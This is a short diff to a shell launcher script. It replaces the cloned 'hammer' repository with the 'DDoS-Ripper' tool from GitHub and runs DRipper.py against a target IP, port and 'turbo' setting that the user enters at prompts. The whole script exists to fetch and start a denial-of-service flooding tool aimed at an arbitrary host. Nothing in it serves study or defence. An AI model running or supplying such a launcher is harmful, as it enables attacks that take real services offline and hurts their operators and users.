@@ -1,5 +1,5 @@
-git clone http://github.com/cyweb/hammer
-cd hammer
+git clone https://github.com/palahsu/DDoS-Ripper.git
+cd DDoS-Ripper
 
 clear
 q="-e"
@@ -24,5 +24,5 @@ read -p "IP ==> " isi
 read -p "PORT ==> " isii
 read -p "TURBO ==> " isiii
 
-python3 hammer.py -s $isi -p $isii -t $isiii
+python3 DRipper.py -s $isi -p $isii -t $isiii
 
